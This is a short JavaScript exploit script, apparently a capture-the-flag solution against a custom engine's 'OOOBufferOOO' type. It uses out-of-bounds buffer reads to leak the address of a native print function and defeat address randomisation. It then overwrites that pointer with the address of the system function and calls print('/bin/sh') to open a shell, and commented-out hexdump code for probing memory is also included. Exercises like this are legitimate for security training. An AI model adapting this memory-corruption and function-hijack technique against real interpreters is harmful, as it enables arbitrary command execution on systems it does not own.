// note
// a.readUInt8(pos);
// a.writeUInt32LE(val, pos);

// kindofzfillbutsuperlame
// function pad(b) {
// 	while (b.length < 2) b = '0' + b;
// 	return b;
// }

// mini "hexdump"
// for (var i = -0x5F18; i < -0x5F00; i += 16) {
// 	r = ''
// 	for (var j = i; j < i + 16; ++j)
// 		r += pad(a.readUInt8(j).toString(16)) + ' ';
// 	print(r);
// }

var a = new OOOBufferOOO(64);
native_system = 0xA220;
native_print = 0xA270;

a[0] = 0xEF;
a[1] = 0xBE;
a[2] = 0xAD;
a[3] = 0xDE;

pie = a.readUInt8(0x9c7b);
pie = pie << 8;
pie|= a.readUInt8(0x9c7a);
pie = pie << 8;
pie|= a.readUInt8(0x9c79);
pie = pie << 8;
pie|= a.readUInt8(0x9c78);
print(pie.toString(16));

pie -= native_print;
print(pie.toString(16));

a.writeUInt32LE(pie + native_system, 0x9c78)
print('/bin/sh')
